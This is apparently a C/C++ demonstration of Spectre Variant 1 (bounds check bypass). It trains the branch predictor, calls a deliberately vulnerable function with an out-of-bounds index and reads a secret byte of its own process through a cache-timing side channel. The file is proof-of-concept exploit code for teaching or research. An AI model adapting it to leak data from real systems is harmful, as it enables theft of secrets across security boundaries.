#include "utils.c"

// --- Spectre Variant 1 (Bounds Check Bypass) ---
// Compile with: g++ -O0 -S spectre_v1.cpp -o spectre_v1.s (and link with main_common.o etc.)
// Or for executable: g++ -O0 spectre_v1.cpp -o spectre_v1 -lrt (for -lrt if using clock_gettime for timing alternatives)

uint8_t public_array[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t secret_data_v1 = 'S'; // The secret byte we want to leak
uint8_t *g_vulnerable_array_v1 = public_array; // Pointer to the "vulnerable" array
size_t g_vulnerable_array_size_v1 = sizeof(public_array);

// The vulnerable function: needs to be marked noinline to prevent optimizations.
// The index is checked, but a branch misprediction can cause transient OOB access.
__attribute__((noinline))
void speculative_read_v1(size_t index) {
    // Architectural check: if index is out-of-bounds, this branch prevents the access.
    // Speculatively, due to training, this branch might be mispredicted, allowing access.
    if (index < g_vulnerable_array_size_v1) {
        // This is the "safe" path. The speculatively executed path will use a larger 'index'.
        volatile uint8_t value = g_vulnerable_array_v1[index];
        // Use the value to access the probe array, creating a cache side-channel.
        // The value from the speculatively executed path will bring its cache line into L1.
        probe_array[value * CACHE_LINE_SIZE] = 1; // Dummy write
    }
}

int main_spectre_v1() {
    common_init();
    printf("\n--- Running Spectre Variant 1 (Bounds Check Bypass) Demo ---\n");

    // --- Training Phase ---
    // Train the branch predictor to predict 'index < array_size' as true.
    // This phase should involve multiple calls with valid indices.
    printf("Training branch predictor...\n");
    for (int i = 0; i < 1000; i++) {
        speculative_read_v1(i % g_vulnerable_array_size_v1);
    }
    _mm_mfence(); // Ensure training writes are visible to memory system.

    // --- Attack Phase ---
    flush_probe_array(); // Clear probe array before attack
    _mm_lfence(); // Architectural fence to prevent reordering beyond this point

    // Calculate the "out-of-bounds" index to read 'secret_data_v1'.
    // This is highly simplified. In a real attack, this offset needs to be
    // discovered (e.g., via reverse engineering or memory layout analysis).
    // Assume `secret_data_v1` is located immediately after `public_array` for simplicity.
    size_t attacker_controlled_oob_index = (size_t)(&secret_data_v1 - g_vulnerable_array_v1);

    printf("Attempting to leak secret data from OOB index %zu...\n", attacker_controlled_oob_index);

    // Call the vulnerable function with the attacker-controlled index.
    // The branch `index < g_vulnerable_array_size_v1` will be mispredicted to true,
    // allowing the speculative access to `secret_data_v1`.
    speculative_read_v1(attacker_controlled_oob_index);

    // Architectural fence: After the speculative_read_v1 call, the misprediction
    // is resolved, and the architectural state is rolled back. However, the
    // microarchitectural effect (cache line fill) remains. LFENCE ensures
    // that subsequent instructions (our timing measurements) don't start
    // before the speculative effects settle.
    _mm_lfence(); 

    // --- Measurement Phase ---
    perform_measurement(secret_data_v1, "Spectre V1 secret");

    printf("Actual secret data: %c\n", secret_data_v1);
    return 0;
}